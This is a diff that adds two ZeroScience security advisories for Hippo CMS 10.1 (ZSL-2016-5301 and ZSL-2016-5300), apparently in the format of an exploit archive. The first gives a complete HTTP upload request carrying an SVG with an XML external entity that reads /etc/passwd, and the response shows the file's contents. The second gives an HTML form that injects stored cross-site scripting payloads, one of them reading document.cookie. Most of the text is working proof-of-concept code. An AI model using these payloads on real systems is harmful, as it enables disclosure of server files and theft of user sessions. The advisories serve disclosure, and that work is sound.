@@ -1,0 +1,179 @@
+﻿
+Hippo CMS 10.1 XML External Entity Information Disclosure Vulnerability
+
+
+Vendor: Hippo B.V.
+Product web page: http://www.onehippo.org
+Affected version: 10.1, 7.9 and 7.8 (Enterprise Edition)
+
+Summary: Hippo CMS is an open source Java CMS. We built it so you
+can easily integrate it into your existing architecture.
+
+Desc: XXE (XML External Entity) processing through upload of SVG
+images in the CMS, and through XML import in the CMS Console application.
+
+Tested on: Linux 2.6.32-5-xen-amd64
+           Java/1.8.0_66
+           Apache-Coyote/1.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5301
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5301.php
+
+Vendor: http://www.onehippo.org/security-issues-list/security-12.html
+        http://www.onehippo.org/about/release-notes/10/10.1.2-release-notes.html
+
+
+04.12.2015
+
+---
+
+
+[Request]:
+
+
+POST /?1-8.IBehaviorListener.0-root-tabs-panel~container-cards-2-panel-center-tabs-panel~container-cards-3-panel-editor-extension.editor-form-template-view-3-item-view-1-item-extension.upload-fileUpload-form-fileUpload HTTP/1.1
+Host: 10.0.2.17
+User-Agent: ZSL_Web_Scanner/2.8
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: https://10.0.2.17/?1&path=/content/gallery/test4.svg
+Content-Length: 2101
+Content-Type: multipart/form-data; boundary=---------------------------20443294602274
+Cookie: [OMMITED]
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+
+-----------------------------20443294602274
+Content-Disposition: form-data; name="id1a0_hf_0"
+
+
+-----------------------------20443294602274
+Content-Disposition: form-data; name="cards:3:panel:editor:extension.editor:form:template:view:1:item
+:view:1:item:value:widget"
+
+
+-----------------------------20443294602274
+Content-Disposition: form-data; name="cards:3:panel:editor:extension.editor:form:template:view:2:item
+:view:1:item:view:1:item:view:1:item:value:widget"
+
+
+-----------------------------20443294602274
+Content-Disposition: form-data; name="cards:3:panel:editor:extension.editor:form:template:view:2:item
+:view:1:item:view:2:item:view:1:item:value:widget"
+
+
+-----------------------------20443294602274
+Content-Disposition: form-data; name="cards:1:panel:editor:extension.editor:form:template:extension.left
+:view:1:item:view:1:item:value:widget"
+
+asd
+-----------------------------20443294602274
+Content-Disposition: form-data; name="cards:1:panel:editor:extension.editor:form:template:extension.left
+:view:2:item:view:1:item:value:widget"
+
+hhh
+-----------------------------20443294602274
+Content-Disposition: form-data; name="cards:1:panel:editor:extension.editor:form:template:extension.left
+:view:3:item:view:1:item:panel:editor"
+
+
+-----------------------------20443294602274
+Content-Disposition: form-data; name="cards:1:panel:editor:extension.editor:form:template:extension.right
+:view:2:item:view:1:item:value:widget"
+
+hhh
+-----------------------------20443294602274
+Content-Disposition: form-data; name="cards:1:panel:editor:extension.editor:form:template:extension.right
+:view:3:item:view:1:item:value:widget"
+
+hhhh
+-----------------------------20443294602274
+Content-Disposition: form-data; name="files[]"; filename="svgupload2.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="yes"?><!DOCTYPE zsl [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]
+><svg width="500px" height="40px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999
+/xlink" version="1.1">&xxe;</svg>
+-----------------------------20443294602274--
+
+
+
+[Response]:
+
+
+<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www
+.w3.org/1999/xlink" height="7" version="1.1" viewBox="0 0 500.0 40.0" width="98">
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+***
+***
+***
+***
+</svg>
+
+###############################################################################
+
+<!--
+
+Hippo CMS 10.1 Stored Cross-Site Scripting Vulnerability
+
+
+Vendor: Hippo B.V.
+Product web page: http://www.onehippo.org
+Affected version: 10.1, 7.9 and 7.8 (Enterprise Edition)
+
+Summary: Hippo CMS is an open source Java CMS. We
+built it so you can easily integrate it into your
+existing architecture.
+
+Desc: Hippo CMS suffers from a stored XSS vulnerability.
+Input passed thru the POST parameters 'groupname' and
+'description' is not sanitized allowing the attacker to
+execute HTML code into user's browser session on the
+affected site.
+
+
+Tested on: Linux 2.6.32-5-xen-amd64
+           Java/1.8.0_66
+           Apache-Coyote/1.1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5300
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5300.php
+
+Vendor: http://www.onehippo.org/security-issues-list/security-12.html
+        http://www.onehippo.org/about/release-notes/10/10.1.2-release-notes.html
+
+
+04.12.2015
+
+-->
+
+
+<html>
+ <body>
+  <form action="https://10.0.2.17/?1-1.IBehaviorListener.0-root-tabs-panel~container-cards-6-panel-panel-form-create~button" method="POST">
+   <input type="hidden" name="id26c_hf_0" value="" />
+   <input type="hidden" name="groupname" value="<img src=ko onerror=confirm(document.cookie)>" />
+   <input type="hidden" name="description" value="<img src=ko onerror=confirm(2)>" />
+   <input type="hidden" name="create-button" value="1" />
+   <input type="submit" value="Inject code" />
+  </form>
+ </body>
+</html>
